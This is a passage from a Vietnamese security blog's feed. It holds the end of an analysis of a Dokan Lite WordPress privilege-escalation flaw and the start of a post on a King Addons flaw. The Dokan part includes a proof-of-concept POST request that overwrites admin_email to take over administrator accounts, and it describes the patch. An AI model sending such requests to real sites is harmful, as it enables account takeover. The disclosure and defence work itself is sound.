cho:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;shop_manager&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;administrator&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;$wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này đồng nghĩa với việc &lt;strong&gt;Shop Manager có quyền &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Như vậy, để hàm &lt;code&gt;save_settings_value()&lt;/code&gt; tiếp tục xử lý thì user phải có role &lt;code&gt;Shop manager&lt;/code&gt;, ta có thể tạo user với quyền này trong Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#34; title=&#34;Create Shop Manager User&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Shop Manager User&lt;/h2&gt;&lt;p&gt;Create Shop Manager User&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#39; alt=&#34;Create Shop Manager User&#34; height=&#34;555&#34; width=&#34;1195&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create Shop Manager User&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Đúng như tên gọi của hàm &lt;code&gt;save_settings_value()&lt;/code&gt;, chức năng của nó là lưu các thiết lập (settings) của Dokan.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#34; title=&#34;Setting của Dokan trong UI&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/setting.png&#34; data-sub-html=&#34;&lt;h2&gt;Setting&lt;/h2&gt;&lt;p&gt;Setting của Dokan trong UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#39; alt=&#34;Setting&#34; height=&#34;913&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setting của Dokan trong UI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tận dụng sức mạnh của &lt;strong&gt;debugger&lt;/strong&gt;, ta đặt &lt;strong&gt;breakpoint&lt;/strong&gt; tại hàm &lt;code&gt;save_settings_value()&lt;/code&gt; và thực hiện thao tác &lt;strong&gt;lưu settings&lt;/strong&gt; từ giao diện quản trị.&lt;/p&gt;&#xA;&lt;p&gt;Nếu debugger hoạt động đúng, &lt;strong&gt;luồng thực thi sẽ dừng lại ngay tại breakpoint&lt;/strong&gt;, xác nhận rằng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Request lưu settings thực sự đi vào hàm &lt;code&gt;save_settings_value()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Người dùng hiện tại đã &lt;strong&gt;vượt qua kiểm tra quyền &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Nonce &lt;code&gt;dokan_admin&lt;/code&gt; là &lt;strong&gt;hợp lệ&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#34; title=&#34;Debugger hoạt động&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/debug.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger hoạt động&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#39; alt=&#34;Debug&#34; height=&#34;637&#34; width=&#34;1904&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger hoạt động&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Điều này cho thấy chức năng lưu settings thực sự có thể được thực thi thành công, và luồng xử lý hoạt động đúng như phân tích ở trên.&lt;/p&gt;&#xA;&lt;p&gt;Đây là điểm máu chốt khiến lõ hổng xảy ra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;$option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; );&#xA;update_option( $option_name, $option_value );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đoạn mã trên cho phép &lt;strong&gt;dữ liệu từ request được ghi trực tiếp vào &lt;code&gt;wp_options&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Trong đó, &lt;strong&gt;người dùng có thể kiểm soát hoàn toàn &lt;code&gt;$option_name&lt;/code&gt; thông qua tham số &lt;code&gt;section&lt;/code&gt;&lt;/strong&gt;. Mặc dù dữ liệu có được sanitize, nhưng &lt;strong&gt;không hề có cơ chế giới hạn (whitelist) các option được phép cập nhật&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi kết hợp với việc &lt;strong&gt;Shop Manager có quyền &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;, một role &lt;strong&gt;không phải Administrator&lt;/strong&gt; vẫn có thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ghi hoặc ghi đè &lt;strong&gt;bất kỳ option nào&lt;/strong&gt; trong hệ thống&lt;/li&gt;&#xA;&lt;li&gt;Thay đổi &lt;strong&gt;các cấu hình có phạm vi toàn cục của WordPress/Dokan&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Điều này dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, vì người dùng có quyền thấp hơn có thể &lt;strong&gt;thực hiện các hành động vốn chỉ nên dành cho Administrator&lt;/strong&gt;, thông qua việc thao túng các option quan trọng trong database.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Một kịch bản phổ biến để khai thác lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua hàm &lt;code&gt;update_option()&lt;/code&gt; là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;users_can_register = 1&lt;/code&gt; → cho phép người dùng tự đăng ký&lt;/li&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;default_role = administrator&lt;/code&gt; → người dùng mới được tạo sẽ có quyền Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhiên, trong môi trường sử dụng &lt;strong&gt;WooCommerce&lt;/strong&gt; kết hợp với &lt;strong&gt;Dokan&lt;/strong&gt;, luồng đăng ký người dùng &lt;strong&gt;không sử dụng &lt;code&gt;/wp-login.php?action=register&lt;/code&gt; mặc định của WordPress&lt;/strong&gt;, mà bắt buộc thông qua endpoint &lt;strong&gt;&lt;code&gt;/my-account/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#34; title=&#34;Register&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/register.png&#34; data-sub-html=&#34;&lt;h2&gt;Register&lt;/h2&gt;&lt;p&gt;Register&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#39; alt=&#34;Register&#34; height=&#34;1081&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Register&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cơ chế này chỉ cho phép người dùng đăng ký với vai trò &lt;strong&gt;Customer&lt;/strong&gt; hoặc &lt;strong&gt;Vendor&lt;/strong&gt;, vì vậy &lt;strong&gt;không thể khai thác theo kịch bản thay đổi &lt;code&gt;default_role&lt;/code&gt; như trên&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Mặc dù vậy, kẻ tấn công vẫn có thể khai thác theo hướng khác. Cụ thể, bằng cách &lt;strong&gt;thay đổi option &lt;code&gt;admin_email&lt;/code&gt;&lt;/strong&gt;, attacker có thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Gán email quản trị về email do mình kiểm soát&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng chức năng &lt;strong&gt;Forgot Password&lt;/strong&gt; để đặt lại mật khẩu&lt;/li&gt;&#xA;&lt;li&gt;Chiếm quyền truy cập tài khoản &lt;strong&gt;Administrator&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ví dụ kiểm tra trong database:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_options where option_name = &amp;#39;admin_email&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name | option_value    | autoload |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;|         7 | admin_email | admin@gmail.com | on       |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.001 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cách khai thác này vẫn dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, dù không tạo admin trực tiếp, mà thông qua &lt;strong&gt;chiếm quyền tài khoản quản trị hiện có&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;v4.1.3&lt;/strong&gt; đã bổ sung &lt;strong&gt;kiểm tra và giới hạn &lt;code&gt;option_name&lt;/code&gt;&lt;/strong&gt;, chỉ cho phép cập nhật các option &lt;strong&gt;nằm trong danh sách section hợp lệ&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// validate and sanitize option name to avoid any unwanted option update&#xA;if ( ! in_array( $option_name, wp_list_pluck( $this-&amp;gt;get_settings_sections(), &amp;#39;id&amp;#39; ), true ) ) {&#xA;    throw new DokanException( &amp;#39;dokan_settings_invalid_section&amp;#39;, __( &amp;#39;Invalid section name.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhờ đó, người dùng &lt;strong&gt;không thể tùy ý chỉ định option name&lt;/strong&gt;, ngăn chặn việc ghi đè các option nhạy cảm như &lt;code&gt;admin_email&lt;/code&gt;, và &lt;strong&gt;khắc phục lỗ hổng Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Shop Manager (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Save Settings (Dokan Admin UI)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=dokan_save_settings&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_dokan_save_settings&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Settings::save_settings_value()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;current_user_can(&amp;#39;manage_woocommerce&amp;#39;)?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I{&amp;#34;Nonce dokan_admin valid?&amp;#34;}&#xA;&#xA;I -- No --&amp;gt; J[&amp;#34;Abort&amp;#34;]&#xA;I -- Yes --&amp;gt; K[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;section taken as option_name&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;settingsData taken as option_value&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;update_option(option_name, option_value)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Sensitive wp_options modified&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Change admin_email&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Use Forgot Password&amp;#34;]&#xA;Q --&amp;gt; R[&amp;#34;Take over Administrator account&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=dokan#/settings&lt;/code&gt; và click &lt;code&gt;Save Changes&lt;/code&gt; button&lt;/li&gt;&#xA;&lt;li&gt;Cho request đi qua Burp Proxy&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request với params &lt;code&gt;section=admin_email&lt;/code&gt; và &lt;code&gt;settingsData=attacker@gmail.com&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: shop_manager_cookie&#xA;&#xA;action=dokan_save_settings&amp;amp;nonce=d7311ec197&amp;amp;settingsData=attacker@gmail.com&amp;amp;section=admin_email&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#39; alt=&#34;Result&#34; height=&#34;745&#34; width=&#34;1612&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;Dokan Lite ≤ 4.1.3&lt;/strong&gt; xảy ra do &lt;strong&gt;kiểm soát quyền không chặt chẽ&lt;/strong&gt;. Việc chỉ kiểm tra &lt;code&gt;manage_woocommerce&lt;/code&gt; cho phép &lt;strong&gt;Shop Manager&lt;/strong&gt; thực thi chức năng lưu settings và ghi đè &lt;strong&gt;bất kỳ option nào&lt;/strong&gt; thông qua &lt;code&gt;update_option()&lt;/code&gt;, dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt; (ví dụ chiếm quyền Administrator qua &lt;code&gt;admin_email&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt; là quyền &lt;strong&gt;quá rộng&lt;/strong&gt; cho thao tác toàn cục.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Shop Manager không nên có quyền thay đổi system options&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; phải đi kèm &lt;strong&gt;whitelist option&lt;/strong&gt; hoặc &lt;strong&gt;giới hạn role Administrator&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/dokan-lite/vulnerability/wordpress-dokan-plugin-4-0-8-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin &amp;lt;= 4.1.3 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6325 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-03-cve-2025-6325/</link>
      <pubDate>Sat, 03 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-03-cve-2025-6325/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phân quyền không chính xác (Incorrect Privilege Assignment)&lt;/strong&gt; trong plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; của &lt;strong&gt;KingAddons.com&lt;/strong&gt; cho phép &lt;strong&gt;leo thang đặc quyền (Privilege Escalation)&lt;/strong&gt;.&#xA;Lỗ hổng này ảnh hưởng đến &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; từ &lt;strong&gt;không xác định (n/a)&lt;/strong&gt; đến &lt;strong&gt;phiên bản 51.1.36 trở xuống (&amp;lt;= 51.1.36)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6325&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6325&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 51.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 51.1.37&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/king-addons/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 